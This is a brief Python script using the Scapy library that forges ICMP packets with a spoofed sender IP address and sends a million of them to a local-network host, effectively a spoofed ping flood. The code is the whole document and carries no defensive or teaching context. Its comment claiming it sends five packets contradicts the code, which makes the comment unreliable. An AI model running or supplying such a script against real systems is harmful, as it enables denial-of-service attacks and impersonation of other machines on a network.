from scapy.all import send, IP, ICMP

# Spoofed packet (Faking sender's IP)
packet = IP(src="192.168.1.100", dst="192.168.1.1") / ICMP()

# Send the packet
send(packet, count=1000000)  # Sends 5 packets
print("Spoofed packets sent!")
